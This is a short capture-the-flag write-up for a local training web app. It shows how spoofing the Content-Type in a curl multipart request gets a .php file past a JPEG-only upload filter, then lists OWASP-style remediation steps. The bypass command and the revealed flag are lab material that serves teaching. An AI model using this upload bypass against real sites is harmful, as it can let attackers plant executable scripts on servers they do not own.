# Unrestricted File Upload

On Upload(http://localhost:4242/?page=upload) page located on the bottom of the main page, there are \<form\> tag with attribute `enctype="multipart/formdata` which enables to locate the location of the file.

Once you click `Browse` button, you will be able to locate the file wish to upload, but only with extension `jpeg` is allowed.
<img width="1038" alt="image" src="https://user-images.githubusercontent.com/46742040/202015491-9553f16f-c6dc-4b2c-b6d9-c1a84ce4856e.png">
(A screenshot where image is uploaded with no `jpeg` extension)

<img width="1021" alt="image" src="https://user-images.githubusercontent.com/46742040/202015974-04c11238-a64c-472b-a20b-43f59046f518.png">
(A screenshot where the sample image with file name `image.jpeg` is uploaded)

On curl, there is an option to upload a file with changing `Content-Type` header.

<img width="1503" alt="image" src="https://user-images.githubusercontent.com/46742040/202016708-958e4101-7ae1-4d5b-b034-0866bcf9a9ee.png">
(A screenshot from `man curl`, explaining `-F` flag)

so let's try following

```
touch /tmp/test.php
# -F "Upload=Upload" was provided from inside the <form> tag
curl -X POST -F "Upload=Upload" -F "uploaded=@/tmp/test.php;type=image/jpeg" http://{IP_ADDR}/index.php?page=upload
```
will give an output
```
...
<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/test.php succesfully uploaded.</pre>
...
```

# Remedattion
the vulnerbility that could occur if uploaded script files `php, asp, jsp, etc.` contains malacious code that can be executed. In order to prevent:

- Restrict file types to only necessary ones
- Have at least some sort of filtering, content checking, and go through `whitelist` for uploaded file
- Remove all the control characters, or special charactres (i.e. ;, :, <, >, etc..) from the filenames
- limit the filename, and file size

See More:

- [Unrestricted File Upload | OWASP](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
